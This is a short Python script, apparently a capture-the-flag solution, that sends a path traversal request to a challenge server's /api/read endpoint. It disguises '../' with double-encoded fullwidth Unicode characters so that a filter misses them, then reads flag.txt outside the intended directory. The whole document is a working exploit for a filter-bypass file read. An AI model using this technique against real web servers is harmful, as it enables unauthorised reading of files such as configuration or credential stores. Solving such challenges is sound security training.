import requests

dot = '%25%EF%BC%92%EF%BD%85'  # 全形 "%２ｅ" -> .
slash = '%25%EF%BC%92%EF%BD%86'  # 全形 "%２ｆ" -> /

r = requests.get(f"http://chal.thjcc.org:12024/api/read?f={dot}{dot}{slash}{dot}{dot}{slash}flag.txt") # ../../flag.txt
print(r.text)